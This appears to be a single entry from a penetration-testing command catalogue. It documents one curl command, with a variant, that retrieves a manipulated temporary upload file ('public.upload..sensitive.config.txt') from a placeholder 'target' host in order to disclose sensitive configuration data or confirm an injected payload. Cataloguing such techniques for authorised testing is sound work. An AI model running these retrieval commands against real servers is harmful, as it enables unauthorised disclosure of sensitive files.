---
data: 'curl http://target:8080/public/upload/temp/public.upload..sensitive.config.txt'
tags:
  - disclosure
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.447Z'
id: 844cc962-ae63-48ca-8d6b-22249e7a56fb
verified: false
validated: true
submitted: true
---
# curl-retrieve-temp-file

## Command

```bash
curl http://target:8080/public/upload/temp/public.upload..sensitive.config.txt
```

## Description

Retrieves the content of a manipulated temporary file to disclose or verify injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `http://target:8080/public/upload/temp/public.upload..sensitive.config.txt` | URL of temp file | Yes |

## Examples

### Basic Usage

```bash
curl http://target:8080/public/upload/temp/public.upload..sensitive.config.txt
```

### Advanced Usage

```bash
curl -o output.txt http://target:8080/public/upload/temp/file.with.dots.txt
```

## Expected Output

File content in response body, e.g., sensitive data or injected payload.

## Related

- [[Related Procedure]]
